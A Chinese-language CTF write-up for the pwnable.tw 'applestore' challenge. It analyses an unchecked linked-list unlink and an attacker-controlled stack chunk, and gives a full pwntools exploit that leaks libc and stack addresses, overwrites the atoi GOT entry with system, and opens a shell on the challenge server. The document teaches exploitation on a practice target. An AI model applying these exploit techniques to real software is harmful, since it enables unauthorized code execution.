# pwnable.tw applestore

### 0x1 分析

看一下安全性：

```shell
[*] './applestore'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

地址固定。

常规的菜单题：

```c
int menu()
{
  puts("=== Menu ===");
  printf("%d: Apple Store\n", 1);
  printf("%d: Add into your shopping cart\n", 2);
  printf("%d: Remove from your shopping cart\n", 3);
  printf("%d: List your shopping cart\n", 4);
  printf("%d: Checkout\n", 5);
  return printf("%d: Exit\n", 6);
}
```

观察`Add()`函数可以发现`create`和`insert()`创造了一个单向链表来存每一个块。

每个块的结构：

```c
struct chunk{
  void *name;
  int price;
  void *next;
  void *pre;
}
```

然后在`delet()`里面有个没有检查的unlink。

在`checkout()`里有个额外的块放在了栈上：

```c
if ( v1 == 7174 )
  {
    puts("*: iPhone 8 - $1");
    asprintf(&v2, "%s", "iPhone 8");
    v3 = 1;
    insert((int)&v2);
    v1 = 7175;
  }
```

而观察这个位置，会发现：

```c
// checkout()
char *v2; // [esp+18h] [ebp-20h]
int v3; // [esp+1Ch] [ebp-1Ch]
unsigned int v4; // [esp+2Ch] [ebp-Ch]
```

```c
// delete()
int idx; // [esp+18h] [ebp-30h]
int next; // [esp+1Ch] [ebp-2Ch]
int pre; // [esp+20h] [ebp-28h]
char nptr; // [esp+26h] [ebp-22h]
my_read(&nptr, 0x15u);
```

```c
// add()
char **v1; // [esp+1Ch] [ebp-2Ch]
char nptr; // [esp+26h] [ebp-22h]
unsigned int v3; // [esp+3Ch] [ebp-Ch]
my_read(&nptr, 0x15u);
```

```c
//cart()
char buf; // [esp+26h] [ebp-22h]
unsigned int v6; // [esp+3Ch] [ebp-Ch]
my_read(&buf, 0x15u);
```

刚好这个块是我们可控的。我们可以修改其`next`和`pre`指向任意位置。也可以利用`name`，来泄漏任何位置。

#### 漏洞利用

- 获得这个块
- 构造这个块的`name`指向`atoi()`的GOT，可以leak libc
- 构造这个块的`name`指向`environ`，可以泄漏环境变量的位置，从而获得任意栈位置。（地址固定==>地址偏移量固定）
- 构造这个块使unlink的时候，让`delete()`的旧`ebp`指向`atoi + 0x22`从而在`handler()`修改其为`system`，从而get shell
- 具体构造见EXP。

### 0x2 EXP

```python
#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'i386' , os = 'linux', log_level='debug')

# p = process('./applestore')
p = remote('chall.pwnable.tw', 10104)
elf = ELF('./applestore')
# libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('libc_32.so.6')

def debug(p, cmd):
    gdb.attach(p, cmd)
    pause()

def add(idx):
    p.sendlineafter('> ', '2')
    p.sendlineafter('Device Number> ', str(idx))

def delete(idx):
    p.sendlineafter('> ', '3')
    p.sendlineafter('Item Number> ', str(idx))

def cart(content = 'y\n'):
    p.sendlineafter('> ', '4')
    p.sendlineafter('Let me check your cart. ok? (y/n) > ', content)

def checkout():
    p.sendlineafter('> ', '5')
    p.sendlineafter('Let me check your cart. ok? (y/n) > ', 'y\n')

# get iphone8
for i in range(20):     # idx 1  - 20
    add(2)
for i in range(6):      # idx 21 - 26
    add(1)
checkout()

# leak libc
payload = "y\x00" + p32(elf.got['atoi']) + p32(0) + p32(0) + p32(0)
cart(payload)
p.recvuntil('27: ')
atoi_addr = u32(p.recv(4))
libc_base = atoi_addr - libc.symbols['atoi']
libc.address = libc_base
system_addr = libc.sym['system']
sh_addr = next(libc.search('/bin/sh'))
environ = libc.sym['environ']
print ('libc_base', hex(libc_base))
print ('system_addr: ', hex(system_addr))
print ('sh_addr: ', hex(sh_addr))
print ('environ: ', hex(environ))
# p.interactive()
# pause()

# leak stack
payload = "y\x00" + p32(environ) + p32(0) + p32(0) + p32(0)
cart(payload)
p.recvuntil('27: ')
handle_ebp = u32(p.recv(4)) - 0xc4 # b *0x08048BD6
delete_ebp = handle_ebp - 0x40  # 0xffffd598 —▸ 0xffffd5d8
print (hex(handle_ebp))
# pause()

# get shell
payload = '27\x00' + '\x00' * 0x3 + p32(0) + p32(elf.got['atoi'] + 0x22) + p32(delete_ebp - 0x8)
delete(payload)
payload = p32(system_addr) + b';sh;'
p.sendlineafter('> ', payload)
p.interactive()
```

